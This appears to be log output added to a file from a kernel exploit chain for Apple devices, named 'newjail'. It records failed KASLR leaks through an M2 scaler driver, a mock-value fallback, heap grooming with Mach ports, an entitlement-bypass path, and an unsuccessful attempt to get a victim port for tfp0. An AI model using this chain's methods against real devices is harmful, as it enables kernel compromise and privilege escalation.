+[stage0] m2scaler: rec[263] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[264] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[265] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[266] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[267] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[268] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[269] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[270] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[271] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[272] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[273] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[274] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[275] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[276] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[277] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[278] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[279] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[280] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[281] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[282] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[283] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[284] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[285] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[286] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[287] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[288] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[289] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[290] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[291] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[292] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[293] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x5e97fc771dda59f @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[294] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[295] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x6c2f6f23051fa155
+[stage0] m2scaler: rec[296] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[297] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[298] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[299] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[300] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[301] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[302] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[303] ev=0x1fcc5c12 @04=0x3f19c4f7b10bc241 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[304] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[305] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[306] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[307] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[308] ev=0x1fcc5c12 @04=0x3f19c4f73621ce40 @18=0x9f8ed99c784962d7 @20=0xc5ec3b0d04703131
+[stage0] m2scaler: rec[309] ev=0x1fcc5c12 @04=0x3f19c4f73621ce40 @18=0x9f8ed99c784962d7 @20=0xc5ec3b0d04703131
+[stage0] m2scaler: rec[310] ev=0x1fcc5c12 @04=0x3f19c4f73621ce40 @18=0x0 @20=0xc5ec3b0d04703131
+[stage0] m2scaler: rec[311] ev=0x1fcc5c12 @04=0x3f19c4f73621ce40 @18=0x0 @20=0xc5ec3b0d04703131
+[stage0] m2scaler: rec[312] ev=0x1fcc5c12 @04=0x3f19c4f73621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[313] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[314] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[315] ev=0x1fcc5c12 @04=0x3f19c4f73621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[316] ev=0x1fcc5c12 @04=0x3f19c4f73621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[317] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[318] ev=0x1fcc5c12 @04=0x3f19c4f73621ce40 @18=0x0 @20=0x0
+[stage0] m2scaler: rec[319] ev=0x0 @04=0x0 @18=0x0 @20=0x0
+[stage0] m2scaler: no KVA in diag
+[stage0] m2scaler: FAILED
+[stage0] All KASLR leaks failed
+[stage0] Tip: Set NJ_MOCK_KASLR=1 to use mock values for testing
+[chain] KASLR result: r=-1 reg=0x0 aio=0x0 surf=0x0
+[chain] !! KASLR FAILED — no leaks. Cannot proceed.
+[chain] Tip: run 'KASLR' mode alone to see details per-CVE
+=== newjail ready (27 modes) ===
+[UI] mode=24 (FULL — KASLR → ANE → KRW → 86950) target=0x160000000
+[chain] ============================================
+[chain] FULL CHAIN: KASLR → ANE → KRW → 86950
+[chain] ============================================
+[86950] force-reset: torn gate cleared
+[chain] step 1/5: KASLR leaks
+[stage0] === KASLR Leak Stage ===
+[stage0] MOCK MODE: Using fake KASLR values
+[stage0] MOCK: reg=0xfffffe0000000000 surf=0xfffffe0010000000
+[chain] KASLR result: r=0 reg=0xfffffe0000000000 aio=0x0 surf=0xfffffe0010000000
+[chain] step 2/5: ANE OOB (need surf)
+[stage1] === ANE OOB + Groom Stage ===
+[stage1] Target IOSurface KVA: 0xfffffe0010000000
+[stage1] posix_spawn failed: Operation not permitted
+[stage1] NJ_ANE_ALT_PATH=scaler — skipping ANE, using scaler only
+[stage1] scaler: ALT-PATH (bypasses ANE entitlement)
+[stage1] scaler(framework): ALT-PATH via IOSurfaceAccelerator.framework
+[stage1] Grooming heap: 1024 port pairs...
+[stage1] Created 1024/1024 port pairs (alloc_fail=0 insert_fail=0 send_fail=0 last=0x0)
+[stage1] Drained 1024 holes
+[stage1] iosa: dlopen OK '/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator'
+[stage1] iosa: symbols create=0x299bcfbb8 getdiag=0x299bd1180 blit=0x299bd0d00 release=0x0
+[stage1] scaler(framework): accel=0x1227fdc50
+[stage1] scaler(framework): created 64/64 surface pairs
+[stage1] scaler(framework): blit 0/64 ok
+[stage1] scaler(framework): GetDiag -> 0x0
+[stage1] iosa: diag ver=0x2 entries A=64 B=256 total=320
+[stage1] iosa: no kernel KVA found in diag buffer
+[stage1] Scanning victim ports for corruption...
+[stage1] scaler(framework): no corruption detected
+[stage1] scaler: framework path failed, trying legacy IOKit...
+[stage1] scaler: found 'AppleM2ScalerCSCDriver' (obj=0x84103)
+[stage1] scaler: IOServiceOpen type=0 OK
+[stage1] scaler: created 128 IOSurfaces
+[stage1] scaler: triggering with 128 surfaces (req_sz=0x208)
+[stage1] scaler: sel 0 -> 0xe00002c2
+[stage1] scaler: sel 1 -> 0xe00002c2
+[stage1] scaler: sel 2 -> 0xe00002c7
+[stage1] scaler: sel 3 -> 0xe00002c7
+[stage1] scaler: sel 8 -> 0xe00002c2
+[stage1] Scanning victim ports for corruption...
+[stage1] scaler: no corruption detected
+[stage1] scaler ALT-PATH failed
+[chain] ANE result: r=-1 victim=0x0
+[chain] !! ANE FAILED — no victim port. Cannot build tfp0.
